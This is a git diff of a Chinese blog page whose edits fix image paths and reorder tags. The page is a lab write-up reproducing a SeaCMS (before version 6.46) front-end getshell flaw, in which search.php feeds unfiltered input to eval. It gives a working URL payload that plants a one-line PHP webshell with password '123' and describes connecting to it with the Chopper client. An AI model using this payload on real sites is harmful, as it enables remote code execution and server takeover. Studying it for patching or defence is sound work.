@@ -14,16 +14,16 @@
 <meta property="og:url" content="http://black0saturday.github.io/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/index.html">
 <meta property="og:site_name" content="一次就好">
 <meta property="og:description" content="复现一个海洋CMS的前台Getshell漏洞，这个漏洞只在版本6.45之前可以用">
-<meta property="og:image" content="http://black0saturday.github.io/%E6%B5%B7%E6%B4%8BCMS/1.png">
-<meta property="og:image" content="http://black0saturday.github.io/%E6%B5%B7%E6%B4%8BCMS/8.png">
-<meta property="og:image" content="http://black0saturday.github.io/%E6%B5%B7%E6%B4%8BCMS/2.png">
-<meta property="og:image" content="http://black0saturday.github.io/%E6%B5%B7%E6%B4%8BCMS/3.png">
+<meta property="og:image" content="http://black0saturday.github.io/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/1.png">
+<meta property="og:image" content="http://black0saturday.github.io/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/8.png">
+<meta property="og:image" content="http://black0saturday.github.io/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/2.png">
+<meta property="og:image" content="http://black0saturday.github.io/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/3.png">
 <meta property="article:published_time" content="2018-10-19T09:50:17.000Z">
 <meta property="article:modified_time" content="2019-12-30T10:31:51.367Z">
 <meta property="article:author" content="布布f">
 <meta property="article:tag" content="CMS">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://black0saturday.github.io/%E6%B5%B7%E6%B4%8BCMS/1.png">
+<meta name="twitter:image" content="http://black0saturday.github.io/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/1.png">
   
     <link rel="alternative" href="/atom.xml" title="一次就好" type="application/atom+xml">
   
@@ -197,11 +197,11 @@
       
         <p>复现一个海洋CMS的前台Getshell漏洞，这个漏洞只在版本6.45之前可以用<br><a id="more"></a></p>
 <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>首先在本地搭建好环境，这个比较好弄，先下载网站源码：<br><a href="http://www.seacms.net/forum.php?mod=attachment&amp;aid=Nzg2N3wxYjVjZjc5YXwxNTM5OTQ1NDM0fDB8MQ%3D%3D" target="_blank" rel="noopener">http://www.seacms.net/forum.php?mod=attachment&amp;aid=Nzg2N3wxYjVjZjc5YXwxNTM5OTQ1NDM0fDB8MQ%3D%3D</a><br>下好之后放到<code>/var/www/</code>目录下，然后打开浏览器访问它，按照要求安装可以</p>
-<h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p><img src="/海洋CMS/1.png" alt=""><br>进去后可以看到很大的海洋两个字，记住它的特征，以后看到了这样的页面直接知道用的是海洋CMS<br>然后我们查看一下版本，对这个网站框架熟悉的都知道<code>/data/admin/ver.txt/</code>这个路径可以看到网站的补丁，这样可以看到网站的版本<br><img src="/海洋CMS/8.png" alt=""></p>
+<h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p><img src="/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/1.png" alt><br>进去后可以看到很大的海洋两个字，记住它的特征，以后看到了这样的页面直接知道用的是海洋CMS<br>然后我们查看一下版本，对这个网站框架熟悉的都知道<code>/data/admin/ver.txt/</code>这个路径可以看到网站的补丁，这样可以看到网站的版本<br><img src="/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/8.png" alt></p>
 <h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>该漏洞成因在于search.php没有对用户输入内容进行过滤，导致攻击者提交的order参数可进入parseIf函数中执行eval。</p>
 <p>官方在6.46版中修复了该漏洞，修复方法是对用户输入的参数进行过滤并限制长度为20个字符。但这种修复方法并没有完全修复漏洞，因为在替换操作过程中用户输入的几个参数可以进行组合，因此补丁被绕过。  </p>
 <h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>在网站的<code>url/search.php</code>文件里有一个漏洞  可以写入一句话，从而getshell<br>直接拿来准备好的POC：<br>    在url后面加上：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[123])<br>访问之后一句话就生成了，密码是123</p>
-<p>然后可以用菜刀连接了<br>地址就是：<code>http://127.0.0.1/seacms_A5/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[123])</code><br>后边的密码是123<br><img src="/海洋CMS/2.png" alt=""><br>成功getshell<br><img src="/海洋CMS/3.png" alt=""></p>
+<p>然后可以用菜刀连接了<br>地址就是：<code>http://127.0.0.1/seacms_A5/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[123])</code><br>后边的密码是123<br><img src="/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/2.png" alt><br>成功getshell<br><img src="/child/child/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/3.png" alt></p>
 
       
 
@@ -494,6 +494,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -506,15 +510,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">漏洞</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -522,15 +518,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">爆破</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
             
             <div class="clearfix"></div>
